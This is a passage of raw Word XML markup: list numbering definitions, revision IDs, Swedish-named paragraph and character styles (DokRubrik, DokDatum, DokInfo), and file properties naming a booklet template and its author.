    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B7F84F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6"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B278CB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D4382926"/>
    <w:lvl w:ilvl="0" w:tplc="16121D92">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5"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8807389">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="225381545">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="972254287">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1980718377">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="193688131">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1255825629">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="555943606">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1945068039">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1650356061">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="2058889347">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1239902538">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1943806250">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="872304685">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="2019624065">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="120155749">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="1627270058">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="469447801">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1610120101">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="1809475097">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="1946182502">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="1484544100">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="805975500">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="6921918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055"/>
    <w:rsid w:val="000033BE"/>
    <w:rsid w:val="000137B2"/>
    <w:rsid w:val="00013F54"/>
    <w:rsid w:val="00047279"/>
    <w:rsid w:val="00047CB2"/>
    <w:rsid w:val="00065396"/>
    <w:rsid w:val="00065C87"/>
    <w:rsid w:val="0008206E"/>
    <w:rsid w:val="00085ACF"/>
    <w:rsid w:val="0008643B"/>
    <w:rsid w:val="00092B43"/>
    <w:rsid w:val="000A2FB1"/>
    <w:rsid w:val="000A4A85"/>
    <w:rsid w:val="000B2C2D"/>
    <w:rsid w:val="000B41C3"/>
    <w:rsid w:val="000D0A57"/>
    <w:rsid w:val="000E2055"/>
    <w:rsid w:val="000F6597"/>
    <w:rsid w:val="00104C9F"/>
    <w:rsid w:val="00123C9A"/>
    <w:rsid w:val="001270B3"/>
    <w:rsid w:val="00170CFB"/>
    <w:rsid w:val="00176340"/>
    <w:rsid w:val="001A7468"/>
    <w:rsid w:val="001B0E65"/>
    <w:rsid w:val="001B5514"/>
    <w:rsid w:val="001E4AF1"/>
    <w:rsid w:val="00227F7D"/>
    <w:rsid w:val="0023639C"/>
    <w:rsid w:val="002401A3"/>
    <w:rsid w:val="002413EE"/>
    <w:rsid w:val="0025622A"/>
    <w:rsid w:val="002F01C9"/>
    <w:rsid w:val="002F3FDE"/>
    <w:rsid w:val="002F4A5B"/>
    <w:rsid w:val="00334056"/>
    <w:rsid w:val="00371949"/>
    <w:rsid w:val="00377EE4"/>
    <w:rsid w:val="00386E7C"/>
    <w:rsid w:val="003A6018"/>
    <w:rsid w:val="003C46DD"/>
    <w:rsid w:val="003D07C6"/>
    <w:rsid w:val="003D530A"/>
    <w:rsid w:val="0040143F"/>
    <w:rsid w:val="004242BB"/>
    <w:rsid w:val="004653E4"/>
    <w:rsid w:val="004C5533"/>
    <w:rsid w:val="004E20B4"/>
    <w:rsid w:val="00533D68"/>
    <w:rsid w:val="00555C61"/>
    <w:rsid w:val="00570BE6"/>
    <w:rsid w:val="00590789"/>
    <w:rsid w:val="005C47CF"/>
    <w:rsid w:val="005C4BD5"/>
    <w:rsid w:val="005D57C2"/>
    <w:rsid w:val="00604C4B"/>
    <w:rsid w:val="00611291"/>
    <w:rsid w:val="0065221F"/>
    <w:rsid w:val="006A17B0"/>
    <w:rsid w:val="006A58D8"/>
    <w:rsid w:val="006A67CF"/>
    <w:rsid w:val="006C15A2"/>
    <w:rsid w:val="006D69DA"/>
    <w:rsid w:val="006F6E58"/>
    <w:rsid w:val="00703309"/>
    <w:rsid w:val="0071291C"/>
    <w:rsid w:val="00725065"/>
    <w:rsid w:val="0075061D"/>
    <w:rsid w:val="007811D6"/>
    <w:rsid w:val="00786D1D"/>
    <w:rsid w:val="007A005C"/>
    <w:rsid w:val="007D3293"/>
    <w:rsid w:val="007F42F7"/>
    <w:rsid w:val="007F7C2A"/>
    <w:rsid w:val="00800499"/>
    <w:rsid w:val="00827CE2"/>
    <w:rsid w:val="00891587"/>
    <w:rsid w:val="008962C2"/>
    <w:rsid w:val="00897A8C"/>
    <w:rsid w:val="00900FCD"/>
    <w:rsid w:val="009011D4"/>
    <w:rsid w:val="009430E3"/>
    <w:rsid w:val="009465D6"/>
    <w:rsid w:val="00961DCE"/>
    <w:rsid w:val="00971774"/>
    <w:rsid w:val="009B3E23"/>
    <w:rsid w:val="009C76D1"/>
    <w:rsid w:val="009D4153"/>
    <w:rsid w:val="009E3267"/>
    <w:rsid w:val="009E4D5D"/>
    <w:rsid w:val="009E6CF7"/>
    <w:rsid w:val="009F46FC"/>
    <w:rsid w:val="00A16AD3"/>
    <w:rsid w:val="00A53846"/>
    <w:rsid w:val="00A55672"/>
    <w:rsid w:val="00A757E7"/>
    <w:rsid w:val="00A806A1"/>
    <w:rsid w:val="00A944D9"/>
    <w:rsid w:val="00A94885"/>
    <w:rsid w:val="00AD0A70"/>
    <w:rsid w:val="00B10AAF"/>
    <w:rsid w:val="00B36262"/>
    <w:rsid w:val="00B52369"/>
    <w:rsid w:val="00B52B06"/>
    <w:rsid w:val="00B60A42"/>
    <w:rsid w:val="00B60D91"/>
    <w:rsid w:val="00B63A96"/>
    <w:rsid w:val="00B91CF4"/>
    <w:rsid w:val="00BA1922"/>
    <w:rsid w:val="00BB0BF4"/>
    <w:rsid w:val="00BE4704"/>
    <w:rsid w:val="00BF2C20"/>
    <w:rsid w:val="00BF4D24"/>
    <w:rsid w:val="00C266E7"/>
    <w:rsid w:val="00C35D42"/>
    <w:rsid w:val="00C42371"/>
    <w:rsid w:val="00C471D1"/>
    <w:rsid w:val="00C61EB4"/>
    <w:rsid w:val="00C865F4"/>
    <w:rsid w:val="00CA5724"/>
    <w:rsid w:val="00CB5890"/>
    <w:rsid w:val="00CC1984"/>
    <w:rsid w:val="00CF7D77"/>
    <w:rsid w:val="00D23646"/>
    <w:rsid w:val="00D406DF"/>
    <w:rsid w:val="00D51526"/>
    <w:rsid w:val="00DC73F9"/>
    <w:rsid w:val="00DD1107"/>
    <w:rsid w:val="00E275DD"/>
    <w:rsid w:val="00E424ED"/>
    <w:rsid w:val="00EB3D2A"/>
    <w:rsid w:val="00ED7FB6"/>
    <w:rsid w:val="00EE271F"/>
    <w:rsid w:val="00F0686F"/>
    <w:rsid w:val="00F1179E"/>
    <w:rsid w:val="00F23E75"/>
    <w:rsid w:val="00F23E98"/>
    <w:rsid w:val="00F4692A"/>
    <w:rsid w:val="00F61A23"/>
    <w:rsid w:val="00F62D6C"/>
    <w:rsid w:val="00FC1BC5"/>
    <w:rsid w:val="00FD06D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F989"/>
  <w15:docId w15:val="{4A7585EE-0763-4D99-899A-26E16A339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AAF"/>
    <w:pPr>
      <w:spacing w:after="120" w:line="290" w:lineRule="auto"/>
      <w:ind w:left="11" w:hanging="11"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:color w:val="061F57"/>
      <w:spacing w:val="15"/>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numPr>
        <w:ilvl w:val="1"/>
      </w:num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ind w:left="11" w:hanging="11"/>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customStyle="1" w:styleId="DokRubrik">
    <w:name w:val="DokRubrik"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="DokRubrikChar"/>
    <w:qFormat/>
    <w:rsid w:val="009E4D5D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:sz w:val="52"/>
      <w:szCs w:val="52"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="DokRubrikChar">
    <w:name w:val="DokRubrik Char"/>
    <w:basedOn w:val="Standardstycketeckensnitt"/>
    <w:link w:val="DokRubrik"/>
    <w:rsid w:val="009E4D5D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:color w:val="061F57"/>
      <w:spacing w:val="15"/>
      <w:sz w:val="52"/>
      <w:szCs w:val="52"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DokDatum">
    <w:name w:val="DokDatum"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="DokDatumChar"/>
    <w:qFormat/>
    <w:rsid w:val="009E4D5D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="DokDatumChar">
    <w:name w:val="DokDatum Char"/>
    <w:basedOn w:val="Standardstycketeckensnitt"/>
    <w:link w:val="DokDatum"/>
    <w:rsid w:val="009E4D5D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:color w:val="061F57"/>
      <w:spacing w:val="15"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DokInfo">
    <w:name w:val="DokInfo"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="DokInfoChar"/>
    <w:qFormat/>
    <w:rsid w:val="009E4D5D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="DokInfoChar">
    <w:name w:val="DokInfo Char"/>
    <w:basedOn w:val="Standardstycketeckensnitt"/>
    <w:link w:val="DokInfo"/>
    <w:rsid w:val="009E4D5D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:color w:val="061F57"/>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tl\Documents\Anpassade%20Office-mallar\Format-mall-haf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Format-mall-hafte.dotx</Template>
  <TotalTime>6</TotalTime>
  <Pages>4</Pages>
  <Words>733</Words>
  <Characters>4183</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>34</Lines>
  <Paragraphs>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Anders Strömberg</dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>Anders Strömberg</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <cp:lastPrinted>2026-09-24T18:00:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-02T08:01:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-02T08:07:00Z</dcterms:modified>
</cp:coreProperties>
</file>